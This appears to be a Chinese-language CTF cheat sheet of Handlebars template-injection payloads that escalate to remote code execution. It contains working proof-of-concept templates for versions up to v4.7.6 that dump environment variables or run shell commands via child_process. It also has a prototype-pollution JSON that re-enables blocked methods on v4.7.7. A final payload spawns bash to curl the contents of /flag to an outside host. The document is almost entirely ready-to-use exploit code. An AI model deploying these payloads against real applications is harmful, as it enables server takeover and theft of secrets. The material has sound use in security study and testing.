## 文章

[Handlebars模板注入到RCE 0day - 掘金](F:\LocalCTF\Handlebars模板注入到RCE 0day - 掘金.pdf)



## POC

### version <= v4.7.6

```json
{{#with this as |obj|}}
    {{#with (obj.constructor.keys "1") as |arr|}}
        {{arr.pop}}
        {{arr.push obj.constructor.name.constructor.bind}}
        {{arr.pop}}
        {{arr.push "return JSON.stringify(process.env);"}}
        {{arr.pop}}
            {{#blockHelperMissing obj.constructor.name.constructor.bind}}
              {{#with (arr.constructor (obj.constructor.name.constructor.bind.apply obj.constructor.name.constructor arr))}}
                {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}
                  {{#with (obj.constructor.defineProperty obj.constructor.prototype "toString" this)}}
                     {{#with (obj.constructor.constructor "test")}}
                        {{this}}
                     {{/with}}
                  {{/with}}
                {{/with}}
              {{/with}}
            {{/blockHelperMissing}}
  {{/with}}
{{/with}
```

```json
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

```json
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### version <= v4.7.7

Handlebars v4.7.7做了修复，主要修复思路应该是把危险助手函数禁用，翻文档发现可以通过设置运行时参数allowedProtoMethods来启用相关函数

https://www.handlebarsjs.cn/api-reference/runtime-options.html

要么可以通过原型链污染来修改`allowedProtoMethods`参数

![](F:\LocalCTF\pictures\640.png)

```json
{"__proto__":
  "allowedProtoMethods":
  {
   "split": true,
   "__lookupGetter__": true,
   "valueOf": true
  }
}
```

**绕过require**

handlebars的模板语法中禁用了require()，无法导入相关模块进行rce，这里需要通过process.binding('spawn_sync').spawn来rce。

```jinja2
{{#with (__lookupGetter__ "__proto__")}} 
  {{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} 
    {{#with ../constructor.prototype}}
      {{../../constructor.defineProperty . "hasOwnProperty" ..}} 
    {{/with}} 
  {{/with}} 
{{/with}} 
{{#with "constructor"}} 
  {{#with split}} 
	{{pop (push "eval('process.binding(\'spawn_sync\').spawn({file:\'/bin/bash\',args: [\'/bin/bash\',\'-c\',\'curl http://x.x.x.x:4041/`cat /flag`\'],stdio:[{type:\'pipe\',readable:!0,writable:!1},{type:\'pipe\',readable:!1,writable:!0},{type:\'pipe\',readable:!1,writable:!0}]});');")}}
    {{#with .}} 
      {{#with (concat (lookup join (slice 0 1)))}} 
        {{#each (slice 2 3)}} 
          {{#with (apply 0 ../..)}} 
             {{.}} 
 	      {{/with}} 
        {{/each}} 
      {{/with}} 
    {{/with}} 
  {{/with}} 
{{/with}}"}
```

